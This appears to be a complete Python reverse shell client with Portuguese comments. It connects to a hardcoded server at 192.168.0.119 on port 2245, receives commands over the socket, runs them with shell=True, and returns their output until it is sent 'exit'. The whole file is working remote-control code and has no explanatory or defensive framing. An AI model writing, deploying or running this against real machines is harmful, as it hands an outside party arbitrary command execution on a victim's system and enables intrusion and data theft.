import socket
import subprocess
import os

def start_client():
    host = '192.168.0.119'  # IP do servidor
    port = 2245

    try:
        # Cria um socket e conecta ao servidor
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        while True:
            try:
                # Recebe o comando do servidor
                command = client_socket.recv(1024).decode()
                
                # Se o comando for 'exit', encerra o loop
                if command.lower() == 'exit':
                    break

                # Comando para mudar o diretório
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        output = os.getcwd()  # Retorna o novo diretório
                    except FileNotFoundError as e:
                        output = str(e)
                else:
                    # Executa o comando e captura a saída
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    except subprocess.CalledProcessError as e:
                        output = e.output

                # Envia a saída de volta para o servidor
                client_socket.sendall(output.encode())

            except Exception as e:
                client_socket.sendall(f"Error: {str(e)}".encode())

    except Exception as e:
        print(f"Failed to connect or run client: {str(e)}")

    finally:
        # Garante que o socket seja fechado ao final
        client_socket.close()

if __name__ == "__main__":
    start_client()
